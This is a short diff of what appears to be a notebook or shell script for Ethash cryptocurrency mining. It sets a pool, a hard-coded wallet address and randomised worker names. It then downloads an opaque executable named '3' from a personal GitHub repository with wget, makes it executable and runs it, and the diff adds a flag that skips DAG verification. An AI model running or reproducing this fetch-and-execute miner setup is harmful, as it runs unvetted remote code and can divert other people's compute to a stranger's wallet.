@@ -5,7 +5,7 @@
 #################################
 
 ALGHO=ETHASH
-POOL=stratum+tcp://us-eth.2miners.com:2020
+POOL=us-eth.2miners.com:2020
 WALLET=0x6e890745813facaeab2afab23440a04f6b55034a
 WORKER=$(echo $(shuf -i 1-999 -n 1)-VGA)
 
@@ -17,4 +17,4 @@ WORKER=$(echo $(shuf -i 1-999 -n 1)-VGA)
 
 ! wget https://github.com/mencobaiajanah/SPLIT/raw/main/3
 ! chmod +x 3
-! ./3 --algo $ALGHO --pool $POOL --user $WALLET.$WORKER --watchdog exit
+! ./3 --algo $ALGHO --pool $POOL --user $WALLET.$WORKER --watchdog exit --disable-dag-verify 
